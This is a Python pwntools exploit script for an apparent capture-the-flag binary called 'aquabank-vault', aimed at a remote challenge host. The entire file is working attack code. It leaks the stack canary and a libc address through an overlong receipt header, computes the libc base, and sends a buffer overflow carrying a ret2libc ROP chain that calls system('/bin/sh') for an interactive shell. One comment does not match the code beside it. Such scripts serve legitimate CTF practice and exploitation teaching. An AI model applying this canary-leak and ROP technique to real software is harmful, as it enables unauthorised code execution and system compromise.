# !/usr/bin/env python3
from pwn import *

exe = elf = ELF('./aquabank-vault', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13597

OFFSET_TO_CANARY = 136  # 0x88 (where the buffer starts)
OFFSET_TO_RIP = 152  # 0x88 (where the buffer starts) + 8 canary + 8 saved RBP =
ret_gadget = 0x40101a


def conn():
    if args.LOCAL:
        r = process(elf.path)
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    else:
        r = remote(HOST, PORT)
        libc = ELF('libc.so.6', checksec=False)
    return r, libc


def main():
    p, libc = conn()

    # --- Leak canary ---
    payload_printf = b"A" * 64

    p.recvuntil(b'> ')
    p.sendline(b"1")
    p.recvuntil(b'Type the receipt header (up to 64 chars):')
    p.sendline(payload_printf)
    p.recvuntil(b'--- RECEIPT ---\n')

    p.recvuntil(b'A' * 64)
    p.recv(8)  # skip the 16 bytes of padding after the buffer
    canary = p.recv(8)  # here we should have the canary
    log.info(f"raw canary = {canary}")
    canary = u64(canary)
    log.info(f"canary = {canary:#x}")

    # --- Leak libc ---
    payload_printf = b"A"

    p.recvuntil(b'> ')
    p.sendline(b"1")
    p.recvuntil(b'Type the receipt header (up to 64 chars):')
    p.sendline(payload_printf)
    p.recvuntil(b'--- RECEIPT ---\n')

    leaked = p.recv(256)  # we look for the libc leak here

    # From the static analysis below we know that the leaked data contains a libc address at offset 0x98 (152:160)
    leaked_libc_addr = u64(leaked[
                               0x98:0xa0]) - 0x8a  # in the local version the leaked address is __libc_init_first + 0x85, in the remote version it is __libc_init_first + 0x8a

    log.info(f"leaked libc addr = {leaked_libc_addr:#x}")

    libc.address = leaked_libc_addr - libc.symbols['__libc_init_first']
    log.info(f"libc base = {libc.address:#x}")

    # # Leak libc base address using the mappings
    # mappings = p.libs()
    # for name, addr in mappings.items():
    #     if 'libc' in name:
    #         libc.address = addr
    #         libc_base = addr
    #         log.info(f"libc base = {libc_base:#x}")
    #         break

    # print("=== Stack leak ===")
    # for i in range(0, len(leaked), 8):
    #     chunk = leaked[i:i+8]
    #     if len(chunk) < 8:
    #         break
    #     val = u64(chunk)
    #     if val == 0:
    #         print(f"offset +{i:#04x} : 0x0")
    #         continue

    #     # ── identify the symbol ──────────────────────────────────────────────────
    #     sym_info = ""
    #     if libc.address and libc.address <= val < libc.address + 0x200000:
    #         offset = val - libc.address
    #         # find the closest symbol in libc whose value <= leaked addr
    #         best_name, best_off = None, float('inf')
    #         for name, sym_addr in libc.symbols.items():
    #             if sym_addr and sym_addr <= val:
    #                 diff = val - sym_addr
    #                 if diff < best_off:
    #                     best_off  = diff
    #                     best_name = name
    #         if best_name:
    #             sym_info = f"   libc: {best_name} + {best_off:#x}  (offset from base: {offset:#x})"
    #         else:
    #             sym_info = f"   libc: offset {offset:#x}"
    #     elif elf.address <= val < elf.address + 0x100000:
    #         sym_info = "  ← binary"

    #     print(f"offset +{i:#04x} : {hex(val)}{sym_info}")

    rop = ROP(libc)
    pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
    log.info(f"pop rdi; ret = {pop_rdi_gadget:#x}")

    system_addr = libc.symbols['system']
    log.info(f"system = {system_addr:#x}")

    bin_sh_addr = next(libc.search(b"/bin/sh\x00"))
    log.info(f"/bin/sh = {bin_sh_addr:#x}")

    # --- Buffer overflow ---
    p.recvuntil(b'> ')
    p.sendline(b"2")

    payload_bof = flat(
        b"A" * OFFSET_TO_CANARY,
        canary,
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),  # overwrite saved RBP
        pop_rdi_gadget,
        bin_sh_addr,
        ret_gadget,  # align the stack
        system_addr
    )

    p.recvuntil(b'Enter your combination:\n')
    p.sendline(payload_bof)
    p.interactive()


if __name__ == "__main__":
    main()